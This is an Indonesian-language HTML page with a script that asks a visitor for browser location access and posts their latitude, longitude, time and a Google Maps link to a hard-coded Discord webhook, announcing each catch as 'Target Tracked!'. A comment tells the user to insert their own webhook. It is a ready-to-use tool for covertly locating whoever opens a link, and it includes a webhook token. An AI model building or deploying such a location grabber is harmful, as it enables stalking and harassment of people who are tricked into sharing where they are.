<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lacak Lokasi</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
        button {
            padding: 12px 24px; font-size: 16px; cursor: pointer;
            background-color: #28a745; color: white; border: none; border-radius: 5px;
        }
        button:hover { background-color: #218838; }
        #status { margin-top: 20px; color: #333; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Akses Lokasi Diperlukan</h2>
    <button id="btnLacak">Izinkan & Lacak Lokasi</button>
    <p id="status"></p>

    <script>
        // GANTI STRING DI BAWAH DENGAN URL WEBHOOK DISCORD ANDA
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1556260323550306316/KWWtWGKeCvh63T0D_M_4RoPra_q8l-NTSrYg_pdZ-_X_fADh4GFuJtN404ZN2dweNqSG";

        document.getElementById('btnLacak').addEventListener('click', function() {
            const statusText = document.getElementById('status');
            statusText.innerText = "Meminta izin dari browser...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(kirimKeDiscord, showError);
            } else {
                statusText.innerText = "Geolokasi tidak didukung oleh browser ini.";
            }
        });

        function kirimKeDiscord(position) {
            const statusText = document.getElementById('status');
            statusText.innerText = "Lokasi didapatkan! Mengirim data...";

            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const waktu = new Date().toLocaleString('id-ID');
            
            // Link Google Maps agar mudah diklik
            const gmapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

            // Pesan yang akan dikirim ke Discord
            const payload = {
                content: `📍 **Target Terlacak!**\n**Waktu:** ${waktu}\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Google Maps:** ${gmapsLink}`
            };

            // Mengirim data menggunakan Fetch API
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if(response.ok) {
                    statusText.innerText = "Selesai! Lokasi berhasil dikirim.";
                    statusText.style.color = "green";
                } else {
                    statusText.innerText = "Gagal mengirim data.";
                    statusText.style.color = "red";
                }
            })
            .catch(error => {
                console.error('Error:', error);
                statusText.innerText = "Gagal terhubung ke server.";
            });
        }

        function showError(error) {
            const statusText = document.getElementById('status');
            statusText.style.color = "red";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    statusText.innerText = "Pengguna menolak izin lokasi."; break;
                case error.POSITION_UNAVAILABLE:
                    statusText.innerText = "Informasi lokasi tidak tersedia."; break;
                case error.TIMEOUT:
                    statusText.innerText = "Permintaan lokasi habis waktu."; break;
                case error.UNKNOWN_ERROR:
                    statusText.innerText = "Terjadi kesalahan tidak dikenal."; break;
            }
        }
    </script>
</body>
</html>
